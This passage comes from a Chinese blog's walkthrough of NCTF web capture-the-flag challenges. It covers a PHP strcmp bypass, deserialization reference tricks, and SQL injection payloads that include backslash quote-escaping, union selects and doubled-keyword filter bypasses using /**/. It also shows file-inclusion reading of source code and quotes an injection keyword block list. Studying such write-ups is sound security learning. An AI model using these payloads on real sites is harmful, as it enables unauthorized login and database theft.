class="string">"flag:nctf&#123;*&#125;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the pass is wrong!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"please input pass!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>拿到flag的条件是strcmp()函数返回0，即两个变量比较结果相等，我们不知道$pass1变量的值，但是strcmp函数处理数组时会返回NULL</p><p>所以我们POST参数pass[]=</p><p>即可拿到flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/37.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h3><p>网址：<a href="http://chinalover.sinaapp.com/web12/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web12/index.php</a></p><p>给出了源代码提示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $one = ord(<span class="string">'1'</span>);</span><br><span class="line">        $nine = ord(<span class="string">'9'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">        &#123;   </span><br><span class="line">                $digit = ord($number&#123;$i&#125;);</span><br><span class="line">                <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">           <span class="keyword">return</span> $number == <span class="string">'54975581388'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$flag=<span class="string">'*******'</span>;</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct($_GET[<span class="string">'key'</span>]))</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'access denied'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对我们GET的参数key进行了检查，不能包含[1-9]任意一个字符，否则就拿不到flag，key值要等于54975581388，可以考虑转化为十六进制，54975581388 的十六进制为0xccccccccc</p><p>输入key=0xccccccccc</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/38.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>拿到flag</p><h3 id="php-反序列化"><a href="#php-反序列化" class="headerlink" title="php 反序列化"></a>php 反序列化</h3><p>这题服务器崩了，只能本地搭环境演示</p><p>给出了源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $enter;</span><br><span class="line">    <span class="keyword">var</span> $secret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'pass'</span>])) &#123;</span><br><span class="line">    $pass = $_GET[<span class="string">'pass'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $pass=stripslashes($pass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $o = unserialize($pass);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($o) &#123;</span><br><span class="line">        $o-&gt;secret = <span class="string">"*"</span>;</span><br><span class="line">        <span class="keyword">if</span> ($o-&gt;secret === $o-&gt;enter)</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulation! Here is my secret: "</span>.$o-&gt;secret;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Oh no... You can't fool me"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"are you trolling?"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先创建了一个类，然后接受GET参数pass，并且对pass进行了去掉转义的处理，get_magic_quotes_gpc()是检查是否对变量有转义处理，如果返回1则说明有转义处理，那么执行stripslashes函数，去掉转义，然后对pass参数进行反转义处理，然后检查对象o的secret变量是否全等于对象o的enter变量，如果相等则输出flag，可是我们不知道enter变量的值，所以我们可以考虑使用引用处理</p><p>例如$a =&amp; $b，则$a和$b指向同一个值，当$a的值变化时，$b的值也随之变化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a =&amp; $b;</span><br><span class="line">$a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$b='</span>.$b; <span class="comment">//$b=1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">$b = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$a='</span>.$a; <span class="comment">//$a=2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>所以我们使$o-&gt;enter =&amp; $o-&gt;secret</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class just4fun &#123;</span><br><span class="line">    var $enter;</span><br><span class="line">    var $secret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = new just4fun();</span><br><span class="line">$o-&gt;enter =&amp; $o-&gt;secret;</span><br><span class="line">$pass = serialize($o);</span><br><span class="line">echo $pass;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/39.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>拿到序列化的$pass，然后将这个pass GET给服务器</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/40.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功拿到flag</p><h3 id="sql-injection-4"><a href="#sql-injection-4" class="headerlink" title="sql injection 4"></a>sql injection 4</h3><p>网址：<a href="http://chinalover.sinaapp.com/web15/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web15/index.php</a></p><p>给出了源代码提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#GOAL: login as admin,then get the flag;</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &apos;db.inc.php&apos;;</span><br><span class="line"></span><br><span class="line">function clean($str)&#123;</span><br><span class="line">if(get_magic_quotes_gpc())&#123;</span><br><span class="line">$str=stripslashes($str);</span><br><span class="line">&#125;</span><br><span class="line">return htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[&apos;username&apos;]);</span><br><span class="line">$password = @clean((string)$_GET[&apos;password&apos;]);</span><br><span class="line"></span><br><span class="line">$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line">if(!$result || mysql_num_rows($result) &lt; 1)&#123;</span><br><span class="line">die(&apos;Invalid password!&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $flag;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>首先需要了解htmlentities() 函数：把字符转换为 HTML 实体 </p><p>而htmlentities($str, ENT_QUOTES); 是 转换双引号和单引号</p><p>我们看个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">$str=stripslashes($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$username='</span>.$username;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$password='</span>.$password;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">$query=<span class="string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</span><br><span class="line"><span class="keyword">echo</span> $query;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们试着GET参数username=’admin’，password=”1”</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/41.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在浏览器页面上看还是单引号和双引号，而看下源代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/42.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现就不是原来的单引号和双引号了，相等于转变成了其他字符，而我们要进行sql注入，就必须闭合单引号</p><p>既然没办法通过输入单引号来闭合单引号，那么还可以通过转义单引号的方法</p><p>试着输入username=\,password= or 1=1 %23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/43.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以此时的sql语句是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name=&apos;\&apos; AND pass=&apos; or 1=1#&apos;;</span><br></pre></td></tr></table></figure><p>可以看到一个单引号被转义，name=后的单引号和pass=后的单引号闭合了，我们再构造or 1=1语句构造恒真语句</p><p>这样就必定有查询结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/44.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>最后拿到flag</p><h3 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h3><p>网址：<a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php</a></p><p>页面是一串jsfuck代码，拿到解码网站解码后结果是1bc29b36f623ba82aaf6724fd3b16718.php </p><p>访问<a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php</a> </p><p>页面显示提示在脑袋里，马上抓包看看响应头，发现tip: history of bash</p><p>查询bash：Bash shell在“~/.bash_history”（“~/”表示用户目录）文件中保存了500条使用过的命令，这样能使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件。</p><p>那么我们访问<a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/45.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现命令zip -r flagbak.zip，解压过压缩包，那我们访问<a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip下载压缩包" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip下载压缩包</a></p><p>获得flag is:nctf{bash_history_means_what}</p><h3 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h3><p>网址：<a href="http://4.chinalover.sinaapp.com/web6/index.php" target="_blank" rel="noopener">http://4.chinalover.sinaapp.com/web6/index.php</a></p><p>给出了源代码提示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = $_POST[user];</span><br><span class="line">  $pass = md5($_POST[pass]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select pw from ctf where user='$user'"</span>));</span><br><span class="line">  <span class="keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>拿到flag条件是查询的结果和我们POST的参数pass的md5值一样，服务器对我们post的参数user没有过滤，根据提示，我们使用union注入控制查询结果，使之和pass的md5值相等</p><p>payloads:user=’ union select md5(1)#&amp;pass=1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/46.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>拿到flag</p><h3 id="综合题2"><a href="#综合题2" class="headerlink" title="综合题2"></a>综合题2</h3><p>网址：<a href="http://cms.nuptzj.cn/" target="_blank" rel="noopener">http://cms.nuptzj.cn/</a></p><p>题目给出了提示这题不是xss，浏览源代码，发现说明文件<a href="http://cms.nuptzj.cn/about.php?file=sm.txt" target="_blank" rel="noopener">http://cms.nuptzj.cn/about.php?file=sm.txt</a></p><p>看到file参数，猜测可能存在文件包含漏洞，试着用php://fileter读取about.php源代码</p><p>解码得about.php源代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file=$_GET[&apos;file&apos;];</span><br><span class="line">if($file==&quot;&quot; || strstr($file,&apos;config.php&apos;))&#123;</span><br><span class="line">echo &quot;fileåæ°ä¸è½ä¸ºç©ºï¼&quot;;</span><br><span class="line">exit();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$cut=strchr($file,&quot;loginxlcteam&quot;);</span><br><span class="line">if($cut==false)&#123;</span><br><span class="line">$data=file_get_contents($file);</span><br><span class="line">$date=htmlspecialchars($data);</span><br><span class="line">echo $date;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;&lt;script&gt;alert(&apos;ææç®å½ï¼ç¦æ­¢æ¥çï¼ä½æ¯ããã&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看看say.php源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;config.php&apos;;</span><br><span class="line">$nice=$_POST[&apos;nice&apos;];</span><br><span class="line">$say=$_POST[&apos;usersay&apos;];</span><br><span class="line">if(!isset($_COOKIE[&apos;username&apos;]))&#123;</span><br><span class="line">setcookie(&apos;username&apos;,$nice);</span><br><span class="line">setcookie(&apos;userpass&apos;,&apos;&apos;);</span><br><span class="line">&#125;</span><br><span class="line">$username=$_COOKIE[&apos;username&apos;];</span><br><span class="line">$userpass=$_COOKIE[&apos;userpass&apos;];</span><br><span class="line">if($nice==&quot;&quot; || $say==&quot;&quot;)&#123;</span><br><span class="line">echo &quot;&lt;script&gt;alert(&apos;æµç§°æçè¨åå®¹ä¸è½ä¸ºç©ºï¼(å¦ææåå®¹ä¹å¼¹åºæ­¤æ¡ï¼ä¸æ¯ç½ç«é®é¢å~ å¥½å§ï¼ç»ä¸ªæç¤ºï¼æ¥çé¡µé¢æºç ææåï¼)&apos;);&lt;/script&gt;&quot;;</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">$con = mysql_connect($db_address,$db_user,$db_pass) or die(&quot;ä¸è½è¿æ¥å°æ°æ®åºï¼ï¼&quot;.mysql_error());</span><br><span class="line">mysql_select_db($db_name,$con);</span><br><span class="line">$nice=mysql_real_escape_string($nice);</span><br><span class="line">$username=mysql_real_escape_string($username);</span><br><span class="line">$userpass=mysql_real_escape_string($userpass);</span><br><span class="line">$result=mysql_query(&quot;SELECT username FROM admin where username=&apos;$nice&apos;&quot;,$con);</span><br><span class="line">$login=mysql_query(&quot;SELECT * FROM admin where username=&apos;$username&apos; AND userpass=&apos;$userpass&apos;&quot;,$con);</span><br><span class="line">if(mysql_num_rows($result)&gt;0 &amp;&amp; mysql_num_rows($login)&lt;=0)&#123;</span><br><span class="line">echo &quot;&lt;script&gt;alert(&apos;æµç§°å·²è¢«ä½¿ç¨ï¼è¯·æ´æ¢ï¼&apos;);&lt;/script&gt;&quot;;</span><br><span class="line">mysql_free_result($login);</span><br><span class="line">mysql_free_result($result);</span><br><span class="line">mysql_close($con);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">mysql_free_result($login);</span><br><span class="line">mysql_free_result($result);</span><br><span class="line">$say=mysql_real_escape_string($say);</span><br><span class="line">mysql_query(&quot;insert into message (nice,say,display) values(&apos;$nice&apos;,&apos;$say&apos;,0)&quot;,$con);</span><br><span class="line">mysql_close($con);</span><br><span class="line">echo &apos;&lt;script&gt;alert(&quot;æå»ºåè°ç¤¾ä¼ï¼çè¨éè¦ç»è¿ç®¡çåå®¡æ ¸æå¯ä»¥æ¾ç¤ºï¼&quot;);window.location = &quot;./index.php&quot;&lt;/script&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>对我们输入的参数都加以转义，没什么漏洞，继续看看还有什么文件，再源代码中还发现了so.php文件</p><p>看看它的源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;æç´¢çè¨&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div id=<span class="string">"say"</span> name=<span class="string">"say"</span> align=<span class="string">"left"</span> style=<span class="string">"width:1024px"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]!=<span class="string">"Xlcteam Browser"</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'ä¸æ¶æ»´é»éï¼æ¬åè½åªæç¨æ¬å¬å¸å¼åçæµè§å¨æå¯ä»¥ç¨å~'</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_POST[<span class="string">'soid'</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'antiinject.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'antixss.php'</span>;</span><br><span class="line">$id=antiinject($id);</span><br><span class="line">$con = mysql_connect($db_address,$db_user,$db_pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"ä¸è½è¿æ¥å°æ°æ®åºï¼ï¼"</span>.mysql_error());</span><br><span class="line">mysql_select_db($db_name,$con);</span><br><span class="line">$id=mysql_real_escape_string($id);</span><br><span class="line">$result=mysql_query(<span class="string">"SELECT * FROM `message` WHERE display=1 AND id=$id"</span>);</span><br><span class="line">$rs=mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">echo</span> htmlspecialchars($rs[<span class="string">'nice'</span>]).<span class="string">':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'</span>.antixss($rs[<span class="string">'say'</span>]).<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">mysql_free_result($result);</span><br><span class="line">mysql_free_result($file);</span><br><span class="line">mysql_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>我们看到这里的参数id虽然被mysql_real_escape_string函数处理过，但是在sql语句中是参数id是没有被引号包裹的，但是id经过自定义函数antiinject处理，这个函数在so.php未被定义，猜测可能定义在包含的文件antiinject.php中，我们再读取它的源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">antiinject</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">$keyword=<span class="keyword">array</span>(<span class="string">"select"</span>,<span class="string">"union"</span>,<span class="string">"and"</span>,<span class="string">"from"</span>,<span class="string">' '</span>,<span class="string">"'"</span>,<span class="string">";"</span>,<span class="string">'"'</span>,<span class="string">"char"</span>,<span class="string">"or"</span>,<span class="string">"count"</span>,<span class="string">"master"</span>,<span class="string">"name"</span>,<span class="string">"pass"</span>,<span class="string">"admin"</span>,<span class="string">"+"</span>,<span class="string">"-"</span>,<span class="string">"order"</span>,<span class="string">"="</span>);</span><br><span class="line">$info=strtolower($content);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=count($keyword);$i++)&#123;</span><br><span class="line"> $info=str_replace($keyword[$i], <span class="string">''</span>,$info);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $info;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显的一个过滤函数，通过str_replace函数过滤一些关键字，但是str_replace函数只需要双写就可以绕过，但是这里还过滤了空格，mysql中注释符/**/可以代替空格</p><p>这里还需注意将请求头的User-Agent字段修改为Xlcteam Browser</p><p>那么我们就可以愉快的注入了，首先POST参数soid=1，发现有查询结果，那么就可以注出查询返回列数</p><p>soid=1/<strong>/oorrdoorrderer/</strong>/by/**/4有查询结果</p><p>soid=1/<strong>/oorrdoorrderer/</strong>/by/**/5无查询结果，返回列数为4</p><p>soid=0时无查询结果，用union注入</p><p>soid=0/<strong>/uunionnion/</strong>/sselectelect/**/1,2,3,4</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/47.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>返回的列在2,3位置</p><p>soid=0/<strong>/uunionnion/</strong>/sselectelect/**/1,database(),3,4爆库</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/48.png" alt="" title="">                </div>                <div class="image-caption"></div>            